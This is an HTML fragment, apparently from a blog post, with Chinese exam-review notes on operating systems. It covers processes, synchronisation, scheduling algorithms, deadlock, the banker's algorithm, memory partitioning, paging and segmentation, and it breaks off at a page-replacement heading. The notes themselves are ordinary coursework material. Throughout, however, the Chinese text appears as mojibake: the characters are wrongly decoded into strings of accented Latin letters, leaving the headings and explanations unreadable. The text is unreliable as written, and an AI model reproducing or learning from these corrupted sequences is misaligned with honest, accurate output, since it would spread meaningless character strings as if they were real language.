    <content type="html"><![CDATA[<h2 id="å¯¹ä¸èµ·æˆ‘çœ‹åäº†ï¼Œè€ƒç‚¸äº†"><a href="#å¯¹ä¸èµ·æˆ‘çœ‹åäº†ï¼Œè€ƒç‚¸äº†" class="headerlink" title="å¯¹ä¸èµ·æˆ‘çœ‹åäº†ï¼Œè€ƒç‚¸äº†"></a><strong>å¯¹ä¸èµ·æˆ‘çœ‹åäº†ï¼Œè€ƒç‚¸äº†</strong></h2><h2 id="æ“ä½œç³»ç»Ÿçš„ç›®æ ‡"><a href="#æ“ä½œç³»ç»Ÿçš„ç›®æ ‡" class="headerlink" title="æ“ä½œç³»ç»Ÿçš„ç›®æ ‡"></a>æ“ä½œç³»ç»Ÿçš„ç›®æ ‡</h2><p><strong>æ–¹ä¾¿æ€§ï¼Œæœ‰æ•ˆæ€§ï¼Œå¯æ‰©å……æ€§å’Œå¼€æ”¾æ€§</strong></p><p>å¯æ‰©å……æ€§ï¼šé‡‡ç”¨å¾®å†…æ ¸ç»“æ„ P30</p><h3 id="å‘å±•ä¸»è¦åŠ¨åŠ›"><a href="#å‘å±•ä¸»è¦åŠ¨åŠ›" class="headerlink" title="å‘å±•ä¸»è¦åŠ¨åŠ›"></a>å‘å±•ä¸»è¦åŠ¨åŠ›</h3><ul><li>ä¸æ–­æé«˜è®¡ç®—æœºèµ„æºåˆ©ç”¨ç‡</li><li>æ–¹ä¾¿ç”¨æˆ·</li><li>å™¨ä»¶çš„æ›´æ–°æ¢ä»£</li><li>ä½“ç³»ç»“æ„çš„å‘å±•</li><li>æ–°çš„åº”ç”¨éœ€æ±‚</li></ul><h3 id="å¤šé“ç¨‹åºè®¾è®¡çš„åŸºæœ¬æ¦‚å¿µ"><a href="#å¤šé“ç¨‹åºè®¾è®¡çš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="å¤šé“ç¨‹åºè®¾è®¡çš„åŸºæœ¬æ¦‚å¿µ"></a>å¤šé“ç¨‹åºè®¾è®¡çš„åŸºæœ¬æ¦‚å¿µ</h3><p>åˆ©ç”¨I/Oæ“ä½œçš„ç©ºé—²æ—¶é—´ï¼Œè°ƒåº¦Bç¨‹åºè¿è¡Œï¼ŒBç©ºé—²è°ƒåº¦Cç­‰    P8</p><h4 id="ä¼˜ç¼ºç‚¹"><a href="#ä¼˜ç¼ºç‚¹" class="headerlink" title="ä¼˜ç¼ºç‚¹"></a>ä¼˜ç¼ºç‚¹</h4><ul><li>èµ„æºåˆ©ç”¨ç‡é«˜</li><li>ååé‡å¤§</li><li>å¹³å‡å‘¨è½¬æ—¶é—´é•¿</li><li>æ²¡æœ‰äº¤äº’èƒ½åŠ›</li></ul><p>==æ“ä½œç³»ç»Ÿå®šä¹‰ä¸º:ä¸€ç»„èƒ½æœ‰æ•ˆç»„ç»‡å’Œç®¡ç†ç¡¬ä»¶å’Œè½¯ä»¶èµ„æºï¼Œåˆç†è¿›è¡Œè°ƒåº¦ï¼Œæ–¹ä¾¿ç”¨æˆ·ä½¿ç”¨ç¨‹åºçš„é›†åˆ==</p><h3 id="åˆ†æ—¶ç³»ç»Ÿï¼ˆThe-Sharing-Systemï¼‰"><a href="#åˆ†æ—¶ç³»ç»Ÿï¼ˆThe-Sharing-Systemï¼‰" class="headerlink" title="åˆ†æ—¶ç³»ç»Ÿï¼ˆThe Sharing Systemï¼‰"></a>åˆ†æ—¶ç³»ç»Ÿï¼ˆThe Sharing Systemï¼‰</h3><p>åœ¨ä¸€å°ä¸»æœºä¸Šè¿æ¥å¤šä¸ªç»ˆç«¯ï¼Œå…è®¸å¤šä¸ªç”¨æˆ·åŒæ—¶é€šè¿‡ç»ˆç«¯ä»¥äº¤äº’æ–¹å¼ä½¿ç”¨è®¡ç®—æœºï¼Œå…±äº«ä¸»æœºèµ„æº</p><h4 id="ç‰¹å¾"><a href="#ç‰¹å¾" class="headerlink" title="ç‰¹å¾"></a>ç‰¹å¾</h4><ul><li>å¤šè·¯æ€§</li><li>ç‹¬ç«‹æ€§</li><li>åŠæ—¶æ€§</li><li>äº¤äº’æ€§</li></ul><h2 id="åŸºæœ¬ç‰¹æ€§"><a href="#åŸºæœ¬ç‰¹æ€§" class="headerlink" title="åŸºæœ¬ç‰¹æ€§"></a>åŸºæœ¬ç‰¹æ€§</h2><p><strong>æœ‰å¹¶å‘ï¼Œå…±äº«ï¼Œè™šæ‹Ÿï¼Œå¼‚æ­¥å››ä¸ªåŸºæœ¬ç‰¹å¾</strong></p><h3 id="å¹¶è¡Œä¸å¹¶å‘"><a href="#å¹¶è¡Œä¸å¹¶å‘" class="headerlink" title="å¹¶è¡Œä¸å¹¶å‘"></a>å¹¶è¡Œä¸å¹¶å‘</h3><p>å¹¶è¡Œï¼šå¤šä¸ªç¨‹åºåŒæ—¶æ‰§è¡Œ</p><p>å¹¶å‘ï¼šåˆ†æ—¶äº¤æ›¿æ‰§è¡Œï¼ˆä¸ºä¸»ï¼‰</p><h4 id="è¿›ç¨‹"><a href="#è¿›ç¨‹" class="headerlink" title="è¿›ç¨‹"></a>è¿›ç¨‹</h4><p>æŒ‡åœ¨ç³»ç»Ÿä¸­å¯ä»¥ç‹¬ç«‹è¿è¡Œå¹¶ä¸”æ˜¯èµ„æºåˆ†é…çš„åŸºæœ¬å•å…ƒ</p><h3 id="å…±äº«"><a href="#å…±äº«" class="headerlink" title="å…±äº«"></a>å…±äº«</h3><p>äº’æ–¥å…±äº«æ–¹å¼å’ŒåŒæ—¶è®¿é—®æ–¹å¼</p><h3 id="è™šæ‹Ÿ"><a href="#è™šæ‹Ÿ" class="headerlink" title="è™šæ‹Ÿ"></a>è™šæ‹Ÿ</h3><p>ï¼ˆæ²¡æœ‰é‚£ä¹ˆå¤šä½†æ„Ÿè§‰æœ‰é‚£ä¹ˆå¤šï¼‰</p><ul><li>æ—¶åˆ†å¤ç”¨æŠ€æœ¯    ï¼ˆç©ºé—²æ—¶ç»™å…¶ä»–ç”¨æˆ·æœåŠ¡</li><li>ç©ºåˆ†å¤ç”¨æŠ€æœ¯    ï¼ˆå‚¨å­˜å™¨ç©ºé—²æ—¶å­˜å‚¨å’Œè¿è¡Œç¨‹åº</li></ul><h3 id="å¼‚æ­¥"><a href="#å¼‚æ­¥" class="headerlink" title="å¼‚æ­¥"></a>å¼‚æ­¥</h3><p>ï¼ˆåŒæ—¶å¼€å§‹ï¼Œä¸åŒæ—¶ç»“æŸï¼‰</p><p>è¿›ç¨‹ä»¥ä¸å¯é¢„çŸ¥çš„é€Ÿåº¦è¿›è¡Œ</p><h2 id="å­˜å‚¨å™¨ç®¡ç†åŠŸèƒ½"><a href="#å­˜å‚¨å™¨ç®¡ç†åŠŸèƒ½" class="headerlink" title="å­˜å‚¨å™¨ç®¡ç†åŠŸèƒ½"></a>å­˜å‚¨å™¨ç®¡ç†åŠŸèƒ½</h2><ul><li>å†…å­˜åˆ†é…</li><li>å†…å­˜ä¿æŠ¤</li><li>åœ°å€æ˜ å°„</li><li>å†…å­˜æ‰©å……</li></ul><h2 id="OSç»“æ„è®¾è®¡"><a href="#OSç»“æ„è®¾è®¡" class="headerlink" title="OSç»“æ„è®¾è®¡"></a>OSç»“æ„è®¾è®¡</h2><p>ç¬¬ä¸€ä»£æ— ç»“æ„OSï¼Œç¬¬äºŒä»£æ¨¡å—åŒ–OSï¼Œç¬¬ä¸‰ä»£åˆ†å±‚å¼OS</p><h2 id="è¿›ç¨‹-1"><a href="#è¿›ç¨‹-1" class="headerlink" title="è¿›ç¨‹"></a>è¿›ç¨‹</h2><p>PCBè¿›ç¨‹æ§åˆ¶å—ï¼ˆProcess Control Blockï¼‰</p><p>å®šä¹‰ï¼š</p><ul><li>è¿›ç¨‹çš„ç¨‹åºçš„ä¸€æ¬¡æ‰§è¡Œ</li><li>è¿›ç¨‹æ˜¯ä¸€ä¸ªç¨‹åºåŠå…¶æ•°æ® é¡ºåºæ‰§è¡Œçš„æ´»åŠ¨</li><li>è¿›ç¨‹æ˜¯ç³»ç»Ÿè¿›è¡Œèµ„æºåˆ†é…çš„ç‹¬ç«‹å•å…ƒ</li></ul><h3 id="ç‰¹æ€§"><a href="#ç‰¹æ€§" class="headerlink" title="ç‰¹æ€§"></a>ç‰¹æ€§</h3><ul><li>åŠ¨æ€æ€§</li><li>å¹¶å‘æ€§</li><li>ç‹¬ç«‹æ€§</li><li>å¼‚æ­¥æ€§</li></ul><h2 id="è¿›ç¨‹çŠ¶æ€è½¬æ¢"><a href="#è¿›ç¨‹çŠ¶æ€è½¬æ¢" class="headerlink" title="è¿›ç¨‹çŠ¶æ€è½¬æ¢"></a>è¿›ç¨‹çŠ¶æ€è½¬æ¢</h2><p>==P42-43==</p><h2 id="æ“ä½œç³»ç»Ÿå†…æ ¸"><a href="#æ“ä½œç³»ç»Ÿå†…æ ¸" class="headerlink" title="æ“ä½œç³»ç»Ÿå†…æ ¸"></a>æ“ä½œç³»ç»Ÿå†…æ ¸</h2><p>å¤„ç†æœºä¸¤ç§æ‰§è¡ŒçŠ¶æ€ï¼šç³»ç»Ÿæ€å’Œç”¨æˆ·æ€</p><h2 id="è¿›ç¨‹åŒæ­¥"><a href="#è¿›ç¨‹åŒæ­¥" class="headerlink" title="è¿›ç¨‹åŒæ­¥"></a>è¿›ç¨‹åŒæ­¥</h2><h3 id="ä¸´ç•Œèµ„æº-ç”Ÿäº§è€…æ¶ˆè´¹è€…é—®é¢˜"><a href="#ä¸´ç•Œèµ„æº-ç”Ÿäº§è€…æ¶ˆè´¹è€…é—®é¢˜" class="headerlink" title="ä¸´ç•Œèµ„æº-ç”Ÿäº§è€…æ¶ˆè´¹è€…é—®é¢˜"></a>ä¸´ç•Œèµ„æº-ç”Ÿäº§è€…æ¶ˆè´¹è€…é—®é¢˜</h3><h3 id="è®¾ç½®ä¸´ç•ŒåŒº"><a href="#è®¾ç½®ä¸´ç•ŒåŒº" class="headerlink" title="è®¾ç½®ä¸´ç•ŒåŒº"></a>è®¾ç½®ä¸´ç•ŒåŒº</h3><ul><li>è¿›å…¥åŒº åˆ¤æ–­èµ„æºæ˜¯å¦è¢«è®¿é—®</li><li>ä¸´ç•ŒåŒº</li><li>é€€å‡ºåŒº å°†æ­£è¢«è®¿é—®æ ‡å¿—æ¢å¤ä¸ºæœªè¢«è®¿é—®</li><li>å‰©ä½™åŒº</li></ul><h3 id="åŒæ­¥è§„åˆ™"><a href="#åŒæ­¥è§„åˆ™" class="headerlink" title="åŒæ­¥è§„åˆ™"></a>åŒæ­¥è§„åˆ™</h3><ul><li>ç©ºé—²è®©è¿›</li><li>å¿™åˆ™ç­‰å¾…</li><li>æœ‰é™ç­‰å¾… æœ‰é™æ—¶é—´å†…èƒ½è®¿é—®</li><li>è®©æƒç­‰å¾… ä¸èƒ½è¿›å…¥åˆ™é‡Šæ”¾å¤„ç†æœº</li></ul><h2 id="åˆ©ç”¨ä¿¡å·é‡å®ç°è¿›ç¨‹äº’æ–¥"><a href="#åˆ©ç”¨ä¿¡å·é‡å®ç°è¿›ç¨‹äº’æ–¥" class="headerlink" title="åˆ©ç”¨ä¿¡å·é‡å®ç°è¿›ç¨‹äº’æ–¥"></a>åˆ©ç”¨ä¿¡å·é‡å®ç°è¿›ç¨‹äº’æ–¥</h2><p>è®¾mutexä¸ºäº’æ–¥ä¿¡å·é‡ï¼Œ=1éƒ½æœªè¿›å…¥ä¸´ç•ŒåŒºï¼Œ=0æœ‰ä¸€ä¸ªè¿›å…¥è¿è¡Œï¼Œå¦ä¸€é˜»å¡ã€‚= -1æœ‰ä¸€æ­£åœ¨è¿è¡Œï¼Œå¦ä¸€ç­‰å¾…ã€‚</p><h2 id="çº¿ç¨‹"><a href="#çº¿ç¨‹" class="headerlink" title="çº¿ç¨‹"></a>çº¿ç¨‹</h2><p>è°ƒåº¦å’Œåˆ†æ´¾çš„åŸºæœ¬å•ä½ï¼Œèƒ½ç‹¬ç«‹è¿è¡Œçš„åŸºæœ¬å•ä½</p><p>åˆ‡æ¢æ—¶ä»…ä¿å­˜å’Œè®¾ç½®å°‘é‡å¯„å­˜å™¨å†…å®¹ï¼Œåˆ‡æ¢ä»£ä»·è¿œä½äºè¿›ç¨‹</p><h2 id="å¤„ç†æœºè°ƒåº¦å±‚æ¬¡"><a href="#å¤„ç†æœºè°ƒåº¦å±‚æ¬¡" class="headerlink" title="å¤„ç†æœºè°ƒåº¦å±‚æ¬¡"></a>å¤„ç†æœºè°ƒåº¦å±‚æ¬¡</h2><h3 id="é«˜çº§è°ƒåº¦"><a href="#é«˜çº§è°ƒåº¦" class="headerlink" title="é«˜çº§è°ƒåº¦"></a>é«˜çº§è°ƒåº¦</h3><p>è°ƒåº¦å¯¹è±¡æ˜¯ä½œä¸šï¼Œå¤šç”¨äºå¤šé“æ‰¹å¤„ç†</p><h3 id="ä½çº§è°ƒåº¦"><a href="#ä½çº§è°ƒåº¦" class="headerlink" title="ä½çº§è°ƒåº¦"></a>ä½çº§è°ƒåº¦</h3><p>å†³å®šå°±ç»ªé˜Ÿåˆ—å“ªä¸ªè¿›ç¨‹è·å¾—å¤„ç†æœº</p><h3 id="ä¸­çº§è°ƒåº¦"><a href="#ä¸­çº§è°ƒåº¦" class="headerlink" title="ä¸­çº§è°ƒåº¦"></a>ä¸­çº§è°ƒåº¦</h3><p>æé«˜å†…å­˜åˆ©ç”¨ç‡å’Œç³»ç»Ÿååé‡ï¼ˆæŠŠæš‚æ—¶ä¸è¿è¡Œçš„è¿›ç¨‹è°ƒè‡³å¤–å­˜ï¼Œæ­¤æ—¶è¿›ç¨‹çŠ¶æ€ä¸ºå°±ç»ª/æŒ‚èµ·çŠ¶æ€ï¼‰</p><h2 id="å…¬å¼"><a href="#å…¬å¼" class="headerlink" title="å…¬å¼"></a>å…¬å¼</h2><h3 id="CPUåˆ©ç”¨ç‡"><a href="#CPUåˆ©ç”¨ç‡" class="headerlink" title="CPUåˆ©ç”¨ç‡"></a>CPUåˆ©ç”¨ç‡</h3><p>CPUåˆ©ç”¨ç‡ = CPUæœ‰æ•ˆå·¥ä½œæ—¶é—´/(CPUæœ‰æ•ˆå·¥ä½œæ—¶é—´ + CPUç©ºé—²ç­‰å¾…æ—¶é—´)</p><h3 id="å¹³å‡å‘¨è½¬æ—¶é—´"><a href="#å¹³å‡å‘¨è½¬æ—¶é—´" class="headerlink" title="å¹³å‡å‘¨è½¬æ—¶é—´"></a>å¹³å‡å‘¨è½¬æ—¶é—´</h3><p>T = 1/n(T1+T2 Â·Â·Â·Â·Â·Â· +Tn)</p><h3 id="å¹³å‡å¸¦æƒå‘¨è½¬æ—¶é—´"><a href="#å¹³å‡å¸¦æƒå‘¨è½¬æ—¶é—´" class="headerlink" title="å¹³å‡å¸¦æƒå‘¨è½¬æ—¶é—´"></a>å¹³å‡å¸¦æƒå‘¨è½¬æ—¶é—´</h3><p>W = 1/n(ä½œä¸šå‘¨è½¬æ—¶é—´Ti/æä¾›æœåŠ¡Ts + Â·Â·Â·Â·Â·Â· ) i=1,2,3,4â€¦..</p><h3 id="ç³»ç»Ÿååé‡å¤§"><a href="#ç³»ç»Ÿååé‡å¤§" class="headerlink" title="ç³»ç»Ÿååé‡å¤§"></a>ç³»ç»Ÿååé‡å¤§</h3><p>ä¸ä½œä¸šå¹³å‡é•¿åº¦æœ‰å…³ï¼Œå•çº¯æé«˜ååé‡å¯é€‰æ‹©å¤šçš„çŸ­ä½œä¸šè¿è¡Œ</p><h2 id="åˆ†æ—¶ç³»ç»Ÿç›®æ ‡"><a href="#åˆ†æ—¶ç³»ç»Ÿç›®æ ‡" class="headerlink" title="åˆ†æ—¶ç³»ç»Ÿç›®æ ‡"></a>åˆ†æ—¶ç³»ç»Ÿç›®æ ‡</h2><ul><li>å“åº”æ—¶é—´å¿«</li><li>å‡è¡¡æ€§ï¼ˆç›¸åº”å¿«æ…¢å’Œè¯·æ±‚çš„å¤æ‚æ€§ç›¸é€‚åº”ï¼‰</li></ul><h2 id="å®æ—¶ç³»ç»Ÿç›®æ ‡"><a href="#å®æ—¶ç³»ç»Ÿç›®æ ‡" class="headerlink" title="å®æ—¶ç³»ç»Ÿç›®æ ‡"></a>å®æ—¶ç³»ç»Ÿç›®æ ‡</h2><ul><li>æˆªæ­¢æ—¶é—´çš„ä¿è¯</li><li>å¯é¢„æµ‹æ€§</li></ul><h2 id="ä½œä¸šè°ƒåº¦ç®—æ³•"><a href="#ä½œä¸šè°ƒåº¦ç®—æ³•" class="headerlink" title="ä½œä¸šè°ƒåº¦ç®—æ³•"></a>ä½œä¸šè°ƒåº¦ç®—æ³•</h2><h3 id="FCFSï¼ˆFirst-Come-First-Serverï¼‰å…ˆæ¥å…ˆæœåŠ¡"><a href="#FCFSï¼ˆFirst-Come-First-Serverï¼‰å…ˆæ¥å…ˆæœåŠ¡" class="headerlink" title="FCFSï¼ˆFirst Come First Serverï¼‰å…ˆæ¥å…ˆæœåŠ¡"></a>FCFSï¼ˆFirst Come First Serverï¼‰å…ˆæ¥å…ˆæœåŠ¡</h3><h3 id="SJF-Short-Job-First-çŸ­ä½œä¸šä¼˜å…ˆ"><a href="#SJF-Short-Job-First-çŸ­ä½œä¸šä¼˜å…ˆ" class="headerlink" title="SJF (Short Job First) çŸ­ä½œä¸šä¼˜å…ˆ"></a>SJF (Short Job First) çŸ­ä½œä¸šä¼˜å…ˆ</h3><h3 id="PSA-Priority-Scheduling-Algorithm-ä¼˜å…ˆçº§è°ƒåº¦ç®—æ³•"><a href="#PSA-Priority-Scheduling-Algorithm-ä¼˜å…ˆçº§è°ƒåº¦ç®—æ³•" class="headerlink" title="PSA (Priority-Scheduling Algorithm) ä¼˜å…ˆçº§è°ƒåº¦ç®—æ³•"></a>PSA (Priority-Scheduling Algorithm) ä¼˜å…ˆçº§è°ƒåº¦ç®—æ³•</h3><p>åŸºäºä½œä¸šç´§è¿«ç¨‹åº¦</p><h3 id="HRRN-Highest-Response-Ratio-Next-é«˜å“åº”æ¯”ä¼˜å…ˆè°ƒåº¦ç®—æ³•"><a href="#HRRN-Highest-Response-Ratio-Next-é«˜å“åº”æ¯”ä¼˜å…ˆè°ƒåº¦ç®—æ³•" class="headerlink" title="HRRN (Highest Response Ratio Next) é«˜å“åº”æ¯”ä¼˜å…ˆè°ƒåº¦ç®—æ³•"></a>HRRN (Highest Response Ratio Next) é«˜å“åº”æ¯”ä¼˜å…ˆè°ƒåº¦ç®—æ³•</h3><p>ä¼˜å…ˆæƒ = (ç­‰å¾…æ—¶é—´ + è¦æ±‚æœåŠ¡æ—¶é—´) / è¦æ±‚æœåŠ¡æ—¶é—´</p><h3 id="RR-Round-Robin-åŸºäºæ—¶é—´ç‰‡çš„è½®è½¬è°ƒåº¦ç®—æ³•"><a href="#RR-Round-Robin-åŸºäºæ—¶é—´ç‰‡çš„è½®è½¬è°ƒåº¦ç®—æ³•" class="headerlink" title="RR ( Round Robin) åŸºäºæ—¶é—´ç‰‡çš„è½®è½¬è°ƒåº¦ç®—æ³•"></a>RR ( Round Robin) åŸºäºæ—¶é—´ç‰‡çš„è½®è½¬è°ƒåº¦ç®—æ³•</h3><h3 id="EDF-Earliest-Deadline-First-æœ€æ—©æˆªæ­¢æ—¶é—´ä¼˜å…ˆç®—æ³•"><a href="#EDF-Earliest-Deadline-First-æœ€æ—©æˆªæ­¢æ—¶é—´ä¼˜å…ˆç®—æ³•" class="headerlink" title="EDF (Earliest Deadline First) æœ€æ—©æˆªæ­¢æ—¶é—´ä¼˜å…ˆç®—æ³•"></a>EDF (Earliest Deadline First) æœ€æ—©æˆªæ­¢æ—¶é—´ä¼˜å…ˆç®—æ³•</h3><h3 id="LLF-Least-Laxity-First-æœ€ä½æ¾å¼›åº¦ç®—æ³•"><a href="#LLF-Least-Laxity-First-æœ€ä½æ¾å¼›åº¦ç®—æ³•" class="headerlink" title="LLF (Least Laxity First) æœ€ä½æ¾å¼›åº¦ç®—æ³•"></a>LLF (Least Laxity First) æœ€ä½æ¾å¼›åº¦ç®—æ³•</h3><p>æ¾å¼›åº¦ = (å¿…é¡»å®Œæˆæ—¶é—´ - æœ¬èº«è¿è¡Œæ—¶é—´ - å½“å‰æ—¶é—´)</p><h2 id="æ­»é”"><a href="#æ­»é”" class="headerlink" title="æ­»é”"></a>æ­»é”</h2><h3 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h3><p>ä¸€ç»„è¿›ç¨‹ä¸­æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½åœ¨ç­‰å¾…åªæœ‰å…¶ä»–è¿›ç¨‹æ‰èƒ½å¼•å‘çš„æ—¶é—´</p><h3 id="å¿…è¦æ¡ä»¶"><a href="#å¿…è¦æ¡ä»¶" class="headerlink" title="å¿…è¦æ¡ä»¶"></a>å¿…è¦æ¡ä»¶</h3><ul><li>äº’æ–¥æ¡ä»¶</li><li>è¯·æ±‚å’Œä¿æŒæ¡ä»¶</li><li>ä¸å¯æŠ¢å æ¡ä»¶</li><li>å¾ªç¯ç­‰å¾…æ¡ä»¶</li></ul><h2 id="é“¶è¡Œå®¶ç®—æ³•-P121"><a href="#é“¶è¡Œå®¶ç®—æ³•-P121" class="headerlink" title="é“¶è¡Œå®¶ç®—æ³• P121"></a>é“¶è¡Œå®¶ç®—æ³• P121</h2><p>åˆ¤æ–­ éœ€æ±‚æ˜¯å¦å°äºç­‰äºéœ€è¦çš„</p><p>åˆ¤æ–­ éœ€è¦æ˜¯å¦å°äºç­‰äºå¯ç”¨çš„</p><p>æ¨¡æ‹Ÿåˆ†é…å¹¶æ£€æµ‹æ˜¯å¦æœ‰å®‰å…¨åºåˆ—</p><h2 id="ç£ç›˜ç¼“å­˜"><a href="#ç£ç›˜ç¼“å­˜" class="headerlink" title="ç£ç›˜ç¼“å­˜"></a>ç£ç›˜ç¼“å­˜</h2><p>åœ¨å†…å­˜ä¸­æš‚å­˜ç£ç›˜ä¸­è¯»å‡ºçš„æ•°æ®</p><h2 id="å›ºå®šåˆ†åŒºåˆ†é…"><a href="#å›ºå®šåˆ†åŒºåˆ†é…" class="headerlink" title="å›ºå®šåˆ†åŒºåˆ†é…"></a>å›ºå®šåˆ†åŒºåˆ†é…</h2><ul><li><p>ç›¸ç­‰ </p></li><li><p>ä¸ç›¸ç­‰ å»ºç«‹è¡¨ï¼Œè®°å½•åˆ†åŒºä¿¡æ¯</p></li></ul><h2 id="åŠ¨æ€åˆ†åŒºåˆ†é…"><a href="#åŠ¨æ€åˆ†åŒºåˆ†é…" class="headerlink" title="åŠ¨æ€åˆ†åŒºåˆ†é…"></a>åŠ¨æ€åˆ†åŒºåˆ†é…</h2><p>å¸¸è§æ•°æ®ç»“æ„:</p><ul><li>ç©ºé—²åˆ†åŒºé“¾</li><li>ç©ºé—²åˆ†åŒºè¡¨</li></ul><h2 id="ç©ºé—²åˆ†åŒºåˆ†é…ç®—æ³•"><a href="#ç©ºé—²åˆ†åŒºåˆ†é…ç®—æ³•" class="headerlink" title="ç©ºé—²åˆ†åŒºåˆ†é…ç®—æ³•"></a>ç©ºé—²åˆ†åŒºåˆ†é…ç®—æ³•</h2><h3 id="FF-First-Fit-é¦–æ¬¡é€‚åº”"><a href="#FF-First-Fit-é¦–æ¬¡é€‚åº”" class="headerlink" title="FF (First Fit) é¦–æ¬¡é€‚åº”"></a>FF (First Fit) é¦–æ¬¡é€‚åº”</h3><p>ä»å¤´æ‰¾ï¼Œæ‰¾åˆ°ç©ºé—´å†åˆ’åˆ†å†…å­˜ç»™ä½œä¸š</p><h3 id="NF-Next-fit-å¾ªç¯é¦–æ¬¡é€‚åº”"><a href="#NF-Next-fit-å¾ªç¯é¦–æ¬¡é€‚åº”" class="headerlink" title="NF (Next fit) å¾ªç¯é¦–æ¬¡é€‚åº”"></a>NF (Next fit) å¾ªç¯é¦–æ¬¡é€‚åº”</h3><p>ä»ä¸Šä¸€æ¬¡æŸ¥æ‰¾åˆ°çš„ç©ºé—²åŒºçš„ä¸‹ä¸€ä¸ªå¼€å§‹æŸ¥æ‰¾</p><h3 id="BF-Best-Fit-æœ€ä½³é€‚åº”ç®—æ³•"><a href="#BF-Best-Fit-æœ€ä½³é€‚åº”ç®—æ³•" class="headerlink" title="BF (Best Fit) æœ€ä½³é€‚åº”ç®—æ³•"></a>BF (Best Fit) æœ€ä½³é€‚åº”ç®—æ³•</h3><p>æŠŠèƒ½æ»¡è¶³è¦æ±‚ã€æœ€å°çš„ç©ºé—²åŒºåˆ†é…ï¼Œä½†ç¢ç‰‡å¾ˆå¤š</p><h3 id="WF-Worst-Fit-æœ€åé€‚åº”ç®—æ³•"><a href="#WF-Worst-Fit-æœ€åé€‚åº”ç®—æ³•" class="headerlink" title="WF (Worst Fit)æœ€åé€‚åº”ç®—æ³•"></a>WF (Worst Fit)æœ€åé€‚åº”ç®—æ³•</h3><p>æ€»æŒ‘é€‰æœ€å¤§çš„ç©ºé—²åŒºè¿›è¡Œåˆ†é…</p><p>ä¼˜ç‚¹ å‰©ä¸‹çš„ç©ºé—²åŒºä¸è‡³äºå¤ªå° æŸ¥æ‰¾æ•ˆç‡é«˜</p><h2 id="åˆ†é¡µå‚¨å­˜"><a href="#åˆ†é¡µå‚¨å­˜" class="headerlink" title="åˆ†é¡µå‚¨å­˜"></a>åˆ†é¡µå‚¨å­˜</h2><h3 id="åˆ†é¡µå‚¨å­˜-1"><a href="#åˆ†é¡µå‚¨å­˜-1" class="headerlink" title="åˆ†é¡µå‚¨å­˜"></a>åˆ†é¡µå‚¨å­˜</h3><h4 id="é¡µé¢å’Œç‰©ç†å—"><a href="#é¡µé¢å’Œç‰©ç†å—" class="headerlink" title="é¡µé¢å’Œç‰©ç†å—"></a>é¡µé¢å’Œç‰©ç†å—</h4><p>ç”¨æˆ·ç¨‹åºçš„åœ°å€ç©ºé—´åˆ†ä¸ºè‹¥å¹²åŒºåŸŸï¼Œæˆä¸ºé¡µã€‚</p><p>å†…å­˜ä¸­åŒæ ·åˆ’åˆ†ï¼Œæˆä¸ºå—</p><p>åœ°å€ç»“æ„ï¼š</p><p>é«˜20ä½ é¡µå· ä½12ä½ ä½åç§»é‡</p><h4 id="é¡µè¡¨"><a href="#é¡µè¡¨" class="headerlink" title="é¡µè¡¨"></a>é¡µè¡¨</h4><p>è®°å½•é¡µåœ¨å†…å­˜ä¸­å¯¹åº”çš„ç‰©ç†å—å·</p><h2 id="åˆ†æ®µç®¡ç†"><a href="#åˆ†æ®µç®¡ç†" class="headerlink" title="åˆ†æ®µç®¡ç†"></a>åˆ†æ®µç®¡ç†</h2><p>ç¼–ç¨‹éœ€è¦ï¼š</p><ul><li>ä¿¡æ¯å…±äº«</li><li>ä¿¡æ¯ä¿æŠ¤</li><li>åŠ¨æ€å¢é•¿</li><li>åŠ¨æ€é“¾æ¥</li></ul><p>ä½œä¸šåœ°å€è¢«åˆ†ä¸ºå¤šä¸ªæ®µï¼Œæ‰€ä»¥å‘ˆç°å‡ºäºŒç»´ç‰¹æ€§</p><p>åˆ†æ®µåœ°å€ï¼š</p><p>é«˜16ä½ æ®µå· ä½16ä½ æ®µå†…åœ°å€</p><h3 id="æ®µè¡¨"><a href="#æ®µè¡¨" class="headerlink" title="æ®µè¡¨"></a>æ®µè¡¨</h3><p>å„ä¸ªæ®µç¦»æ•£çš„æ”¾å…¥å†…å­˜ä¸åŒåˆ†åŒºä¸­ï¼Œéœ€è¦ä¸ºæ¯ä¸ªè¿›ç¨‹å»ºç«‹æ®µæ˜ å°„è¡¨</p><p>å®ç°ä»é€»è¾‘æ®µåˆ°ç‰©ç†å†…å­˜åŒºçš„æ˜ å°„</p><h2 id="è™šæ‹Ÿå­˜å‚¨å™¨å®šä¹‰"><a href="#è™šæ‹Ÿå­˜å‚¨å™¨å®šä¹‰" class="headerlink" title="è™šæ‹Ÿå­˜å‚¨å™¨å®šä¹‰"></a>è™šæ‹Ÿå­˜å‚¨å™¨å®šä¹‰</h2><p>å…·æœ‰è¯·æ±‚è°ƒå…¥å’Œç½®æ¢åŠŸèƒ½ï¼Œä»é€»è¾‘ä¸Šå¯¹å†…å­˜æ‰©å……çš„å­˜å‚¨å™¨ç³»ç»Ÿ</p><h2 id="ç‰¹å¾-1"><a href="#ç‰¹å¾-1" class="headerlink" title="ç‰¹å¾"></a>ç‰¹å¾</h2><ul><li>å¤šæ¬¡æ€§    åˆ†å¤šæ¬¡è£…å…¥å†…å­˜</li><li>å¯¹æ¢æ€§</li><li>è™šæ‹Ÿæ€§</li></ul><h2 id="é¡µé¢ç½®æ¢ç®—æ³•"><a href="#é¡µé¢ç½®æ¢ç®—æ³•" class="headerlink" title="é¡µé¢ç½®æ¢ç®—æ³•"></a>é¡µé¢ç½®æ¢ç®—æ³•</h2><h3 id="Optimal-æœ€ä½³ç½®æ¢ç®—æ³•"><a href="#Optimal-æœ€ä½³ç½®æ¢ç®—æ³•" class="headerlink" title="Optimal æœ€ä½³ç½®æ¢ç®—æ³•"></a>Optimal æœ€ä½³ç½®æ¢ç®—æ³•</h3><p>é¢„æµ‹æœ€ä¹…ä¸ä½¿ç”¨çš„é¡µå¹¶è¿›è¡Œæ›¿æ¢ã€‚</p><h3 id="FIFO-å…ˆè¿›å…ˆå‡ºé¡µé¢ç½®æ¢ç®—æ³•"><a href="#FIFO-å…ˆè¿›å…ˆå‡ºé¡µé¢ç½®æ¢ç®—æ³•" class="headerlink" title="FIFO å…ˆè¿›å…ˆå‡ºé¡µé¢ç½®æ¢ç®—æ³•"></a>FIFO 